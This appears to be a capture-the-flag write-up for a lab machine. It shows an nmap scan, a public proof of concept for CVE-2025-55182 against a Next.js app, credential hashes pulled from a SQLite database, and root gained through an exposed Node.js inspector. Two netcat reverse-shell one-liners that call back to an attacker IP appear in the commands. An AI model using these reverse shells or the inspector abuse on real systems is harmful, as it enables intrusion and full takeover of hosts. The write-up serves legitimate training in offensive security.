`└─$ nmap -p- -sSCV 10.129.6.105 --min-rate 999  `
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 22:35 EDT
Nmap scan report for 10.129.6.105
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
```

#### port 3000
a reactor server for monitoring is running, search for CVE, and got CVE-2025-55182

https://github.com/msanft/CVE-2025-55182/

`python3 poc.py http://10.129.6.105:3000/  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.225 8821 >/tmp/f"`

`─$ nc -nvlp 8821`
```
listening on [any] 8821 ...
connect to [10.10.16.225] from (UNKNOWN) [10.129.6.105] 52336
bash: cannot set terminal process group (1427): Inappropriate ioctl for device
bash: no job control in this shell
node@reactor:/opt/reactor-app$ id
id
uid=999(node) gid=988(node) groups=988(node)
```
`node@reactor:/opt/reactor-app$ ls -la`
```
ls -la
total 76
drwxr-xr-x  5 node node  4096 Dec 28 21:05 .
drwxr-xr-x  4 root root  4096 Apr 27 11:26 ..
drwxr-xr-x  2 node node  4096 Dec 28 20:47 app
-rw-r--r--  1 node node   276 Dec 28 21:05 .env
drwxr-xr-x  7 node node  4096 Dec 28 20:47 .next
-rw-r--r--  1 node node   172 Dec 28 20:47 next.config.js
drwxr-xr-x 30 node node  4096 Dec 28 20:47 node_modules
-rw-r--r--  1 node node   269 Dec 28 20:47 package.json
-rw-r--r--  1 node node 29329 Dec 28 20:47 package-lock.json
-rw-r-----  1 node node 12288 Dec 28 21:03 reactor.db
```

trasfer reactor.db to kali
`.table`

`sqlite> select  * from users;`
```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb reactor1
```
use this credential to ssh into host and got user. run linpeas.sh
```
root        1429  0.0  1.1 1066720 47520 ?       Ssl  02:33   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```
and this user with lxd privi, but lxd and lxc are not intalled in this host. we cannot use it to ES.

#### Priv Escalate
try node js:
set portforwarding
`└─$ ssh -L 9229:localhost:9229 engineer@10.129.6.105`

in chrome based browser
```
chrome://inspect/
click configure to set target IP and port, then inspect
```
https://hacktricks.wiki/en/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.html

`process.mainModule.require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.225 8823 >/tmp/f')`

`└─$ nc -nvlp 8823`
```
listening on [any] 8823 ...
connect to [10.10.16.225] from (UNKNOWN) [10.129.6.105] 55898
bash: cannot set terminal process group (1429): Inappropriate ioctl for device
bash: no job control in this shell
root@reactor:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

#### lesson learned
- node js inspector to privi es
